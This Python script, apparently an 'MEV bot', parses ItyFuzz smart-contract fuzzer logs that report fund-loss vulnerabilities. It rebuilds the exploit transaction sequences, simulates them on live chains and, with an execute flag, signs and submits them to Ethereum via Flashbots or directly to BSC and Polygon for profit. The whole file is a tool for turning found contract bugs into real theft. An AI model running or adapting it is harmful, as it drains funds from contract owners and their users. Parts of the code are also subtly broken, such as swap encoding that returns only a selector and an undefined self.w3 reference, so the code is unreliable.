#!/usr/bin/env python3
"""
ItyFuzz MEV Bot - Converts ItyFuzz vulnerabilities into executable MEV transactions

This bot:
1. Parses ItyFuzz vulnerability logs
2. Simulates transactions using Web3.py and forked networks
3. Executes profitable vulnerabilities as MEV bundles
"""

import re
import json
import time
import logging
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_account import Account
from flashbots import flashbot
import requests

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class Transaction:
    """Represents a single transaction in the exploit sequence"""
    to: str
    value: int
    data: str
    from_address: str = None

@dataclass 
class Vulnerability:
    """Represents a parsed vulnerability from ItyFuzz"""
    name: str
    profit_eth: float
    transactions: List[Transaction]
    block_number: int
    chain: str
    contracts: List[str]

class ItyFuzzLogParser:
    """Parses ItyFuzz vulnerability logs"""
    
    def __init__(self):
        # Patterns for parsing logs
        self.vuln_pattern = r"Found vulnerabilities!.*?\[Fund Loss\]: Anyone can earn ([\d.]+) ETH"
        self.tx_pattern = r"└─\[1\] (.*?)\.(\w+)\{value: ([\d.]+) ether\}\((.*?)\)"
        self.router_swap_pattern = r"Router\.swapExactETHForTokens\{value: ([\d.]+) ether\}\((.*?), path:\((.*?)\), (.*?), (.*?)\)"
        self.call_pattern = r"(0x[a-fA-F0-9]+)\.call\{value: (\d+)\}\((.*?)\)"
        
    def parse_log_file(self, filepath: str) -> List[Vulnerability]:
        """Parse an ItyFuzz log file and extract vulnerabilities"""
        vulnerabilities = []
        
        with open(filepath, 'r') as f:
            content = f.read()
            
        # Find all vulnerabilities
        vuln_matches = list(re.finditer(self.vuln_pattern, content, re.DOTALL))
        
        for match in vuln_matches:
            profit = float(match.group(1))
            
            # Extract transaction sequence after the vulnerability
            start_pos = match.end()
            trace_section = content[start_pos:start_pos + 2000]  # Get next 2000 chars
            
            transactions = self._parse_transactions(trace_section)
            
            # Extract contract addresses from the log
            contracts = self._extract_contracts(content[:start_pos])
            
            vuln = Vulnerability(
                name=filepath.split('/')[-1].replace('.log', ''),
                profit_eth=profit,
                transactions=transactions,
                block_number=self._extract_block_number(content),
                chain=self._extract_chain(filepath),
                contracts=contracts
            )
            
            vulnerabilities.append(vuln)
            
        return vulnerabilities
    
    def _parse_transactions(self, trace: str) -> List[Transaction]:
        """Parse transaction sequence from trace"""
        transactions = []
        
        # Parse Router.swapExactETHForTokens calls
        for match in re.finditer(self.router_swap_pattern, trace):
            value_ether = float(match.group(1))
            value_wei = Web3.to_wei(value_ether, 'ether')
            
            # Parse swap parameters
            amount_out_min = match.group(2)
            path = match.group(3)
            to = match.group(4) 
            deadline = match.group(5)
            
            # Construct transaction - assuming standard Uniswap V2 Router
            # Function selector for swapExactETHForTokens: 0x7ff36ab5
            tokens = path.split(' → ')
            if len(tokens) == 2:
                # Encode function call
                tx = Transaction(
                    to="Router",  # Will be replaced with actual router address
                    value=value_wei,
                    data=self._encode_swap_exact_eth_for_tokens(
                        amount_out_min, tokens, to, deadline
                    )
                )
                transactions.append(tx)
        
        # Parse direct calls
        for match in re.finditer(self.call_pattern, trace):
            to_address = match.group(1)
            value = int(match.group(2))
            data = match.group(3)
            
            tx = Transaction(
                to=to_address,
                value=value,
                data=data
            )
            transactions.append(tx)
            
        return transactions
    
    def _encode_swap_exact_eth_for_tokens(self, amount_out_min: str, path: List[str], 
                                          to: str, deadline: str) -> str:
        """Encode swapExactETHForTokens function call"""
        # This is a simplified encoding - in production use eth_abi
        function_selector = "0x7ff36ab5"
        
        # For now, return the selector - full implementation would encode all params
        return function_selector
    
    def _extract_contracts(self, content: str) -> List[str]:
        """Extract contract addresses from log"""
        contracts = []
        pattern = r"Contract (0x[a-fA-F0-9]{40}) deployed"
        
        for match in re.finditer(pattern, content):
            contracts.append(match.group(1))
            
        return contracts
    
    def _extract_block_number(self, content: str) -> int:
        """Extract block number from log"""
        pattern = r"block[_\s]?number[:\s]+(\d+)"
        match = re.search(pattern, content, re.IGNORECASE)
        return int(match.group(1)) if match else 0
    
    def _extract_chain(self, filepath: str) -> str:
        """Determine chain from filepath or content"""
        if 'bsc' in filepath.lower():
            return 'bsc'
        elif 'polygon' in filepath.lower():
            return 'polygon'
        else:
            return 'eth'

class TransactionSimulator:
    """Simulates transactions to verify profitability"""
    
    def __init__(self, rpc_url: str, block_number: int = None):
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))
        self.w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        self.block_number = block_number or self.w3.eth.block_number
        
    def simulate_transaction(self, tx: Transaction, from_address: str) -> Dict:
        """Simulate a single transaction"""
        try:
            # Build transaction
            transaction = {
                'from': from_address,
                'to': tx.to,
                'value': tx.value,
                'data': tx.data,
                'gas': 5000000,  # High gas limit for simulation
                'gasPrice': self.w3.eth.gas_price
            }
            
            # Use eth_call to simulate
            result = self.w3.eth.call(transaction, block_identifier=self.block_number)
            
            return {
                'success': True,
                'result': result.hex() if result else '0x',
                'error': None
            }
        except Exception as e:
            return {
                'success': False,
                'result': None,
                'error': str(e)
            }
    
    def simulate_bundle(self, transactions: List[Transaction], from_address: str) -> Dict:
        """Simulate a bundle of transactions"""
        results = []
        total_cost = 0
        
        for tx in transactions:
            result = self.simulate_transaction(tx, from_address)
            results.append(result)
            
            if not result['success']:
                return {
                    'success': False,
                    'results': results,
                    'error': f"Transaction failed: {result['error']}"
                }
            
            total_cost += tx.value
            
        return {
            'success': True,
            'results': results,
            'total_cost_wei': total_cost,
            'total_cost_eth': Web3.from_wei(total_cost, 'ether')
        }

class MEVExecutor:
    """Executes MEV opportunities using Flashbots or direct submission"""
    
    def __init__(self, private_key: str, chain: str = 'eth'):
        self.account = Account.from_key(private_key)
        self.chain = chain
        
        # Configure RPC endpoints
        self.rpc_urls = {
            'eth': 'https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY',
            'bsc': 'https://bsc-dataseed.binance.org/',
            'polygon': 'https://polygon-rpc.com'
        }
        
        self.w3 = Web3(Web3.HTTPProvider(self.rpc_urls.get(chain, self.rpc_urls['eth'])))
        
        # Setup Flashbots for Ethereum
        if chain == 'eth':
            flashbot(self.w3, self.account)
    
    def build_transaction_bundle(self, vulnerability: Vulnerability) -> List[Dict]:
        """Build transaction bundle from vulnerability"""
        bundle = []
        nonce = self.w3.eth.get_transaction_count(self.account.address)
        
        for i, tx in enumerate(vulnerability.transactions):
            # Replace placeholder addresses
            to_address = tx.to
            if to_address == "Router":
                # Use appropriate router for the chain
                routers = {
                    'eth': '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',  # Uniswap V2
                    'bsc': '0x10ED43C718714eb63d5aA57B78B54704E256024E',   # PancakeSwap
                    'polygon': '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff' # QuickSwap
                }
                to_address = routers.get(self.chain, tx.to)
            
            transaction = {
                'from': self.account.address,
                'to': to_address,
                'value': tx.value,
                'data': tx.data,
                'nonce': nonce + i,
                'gas': 500000,
                'gasPrice': self.w3.eth.gas_price,
                'chainId': self.w3.eth.chain_id
            }
            
            # Sign transaction
            signed_tx = self.account.sign_transaction(transaction)
            bundle.append(signed_tx.rawTransaction.hex())
            
        return bundle
    
    def execute_bundle_flashbots(self, bundle: List[str], target_block: int) -> Dict:
        """Submit bundle via Flashbots (Ethereum only)"""
        try:
            # Submit bundle
            result = self.w3.flashbots.send_bundle(
                bundle,
                target_block_number=target_block
            )
            
            # Wait for inclusion
            receipts = result.wait()
            
            return {
                'success': True,
                'receipts': receipts,
                'bundle_hash': result.bundle_hash
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    def execute_direct(self, transactions: List[Transaction]) -> List[Dict]:
        """Execute transactions directly (for non-Ethereum chains)"""
        results = []
        
        for tx in transactions:
            try:
                # Send transaction
                tx_hash = self.w3.eth.send_raw_transaction(tx)
                receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)
                
                results.append({
                    'success': True,
                    'tx_hash': tx_hash.hex(),
                    'receipt': receipt
                })
            except Exception as e:
                results.append({
                    'success': False,
                    'error': str(e)
                })
                break
                
        return results

class ItyFuzzMEVBot:
    """Main MEV bot that coordinates parsing, simulation, and execution"""
    
    def __init__(self, private_key: str, config: Dict):
        self.parser = ItyFuzzLogParser()
        self.config = config
        self.executors = {
            'eth': MEVExecutor(private_key, 'eth'),
            'bsc': MEVExecutor(private_key, 'bsc'),
            'polygon': MEVExecutor(private_key, 'polygon')
        }
        
    def process_log_file(self, filepath: str, simulate_only: bool = True):
        """Process an ItyFuzz log file"""
        logger.info(f"Processing log file: {filepath}")
        
        # Parse vulnerabilities
        vulnerabilities = self.parser.parse_log_file(filepath)
        logger.info(f"Found {len(vulnerabilities)} vulnerabilities")
        
        for vuln in vulnerabilities:
            logger.info(f"\nVulnerability: {vuln.name}")
            logger.info(f"Potential profit: {vuln.profit_eth} ETH")
            logger.info(f"Chain: {vuln.chain}")
            logger.info(f"Block: {vuln.block_number}")
            
            # Simulate transactions
            if self.should_simulate(vuln):
                sim_result = self.simulate_vulnerability(vuln)
                
                if sim_result['success']:
                    logger.info(f"Simulation successful! Cost: {sim_result['total_cost_eth']} ETH")
                    
                    # Calculate actual profit
                    actual_profit = vuln.profit_eth - float(sim_result['total_cost_eth'])
                    logger.info(f"Expected profit after costs: {actual_profit} ETH")
                    
                    if not simulate_only and actual_profit > self.config['min_profit_eth']:
                        self.execute_vulnerability(vuln)
                else:
                    logger.error(f"Simulation failed: {sim_result['error']}")
    
    def should_simulate(self, vuln: Vulnerability) -> bool:
        """Determine if vulnerability should be simulated"""
        # Check minimum profit threshold
        if vuln.profit_eth < self.config.get('min_profit_eth', 0.1):
            logger.info(f"Skipping - profit {vuln.profit_eth} ETH below threshold")
            return False
            
        # Check if chain is supported
        if vuln.chain not in self.executors:
            logger.info(f"Skipping - chain {vuln.chain} not supported")
            return False
            
        return True
    
    def simulate_vulnerability(self, vuln: Vulnerability) -> Dict:
        """Simulate vulnerability execution"""
        # Get appropriate RPC for simulation
        rpc_url = self.config['rpc_urls'].get(vuln.chain)
        if not rpc_url:
            return {'success': False, 'error': f'No RPC URL for chain {vuln.chain}'}
        
        # Create simulator
        simulator = TransactionSimulator(rpc_url, vuln.block_number)
        
        # Simulate transaction bundle
        executor = self.executors[vuln.chain]
        return simulator.simulate_bundle(vuln.transactions, executor.account.address)
    
    def execute_vulnerability(self, vuln: Vulnerability):
        """Execute the vulnerability as MEV"""
        logger.info(f"Executing vulnerability on {vuln.chain}")
        
        executor = self.executors[vuln.chain]
        
        if vuln.chain == 'eth':
            # Use Flashbots for Ethereum
            bundle = executor.build_transaction_bundle(vuln)
            target_block = self.w3.eth.block_number + 1
            result = executor.execute_bundle_flashbots(bundle, target_block)
        else:
            # Direct execution for other chains
            bundle = executor.build_transaction_bundle(vuln)
            result = executor.execute_direct(bundle)
        
        if result['success']:
            logger.info(f"Successfully executed! Results: {result}")
        else:
            logger.error(f"Execution failed: {result.get('error', 'Unknown error')}")

def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='ItyFuzz MEV Bot')
    parser.add_argument('log_file', help='Path to ItyFuzz log file')
    parser.add_argument('--private-key', help='Private key for executing transactions', 
                        default=None)
    parser.add_argument('--execute', action='store_true', 
                        help='Execute transactions (default: simulate only)')
    parser.add_argument('--min-profit', type=float, default=0.1,
                        help='Minimum profit threshold in ETH (default: 0.1)')
    parser.add_argument('--rpc-eth', help='Ethereum RPC URL')
    parser.add_argument('--rpc-bsc', help='BSC RPC URL')
    parser.add_argument('--rpc-polygon', help='Polygon RPC URL')
    
    args = parser.parse_args()
    
    # Configuration
    config = {
        'min_profit_eth': args.min_profit,
        'rpc_urls': {
            'eth': args.rpc_eth or 'https://eth-mainnet.g.alchemy.com/v2/demo',
            'bsc': args.rpc_bsc or 'https://bsc-dataseed.binance.org/',
            'polygon': args.rpc_polygon or 'https://polygon-rpc.com'
        }
    }
    
    # Create bot
    private_key = args.private_key or Account.create().key.hex()
    bot = ItyFuzzMEVBot(private_key, config)
    
    # Process log file
    bot.process_log_file(args.log_file, simulate_only=not args.execute)

if __name__ == '__main__':
    main()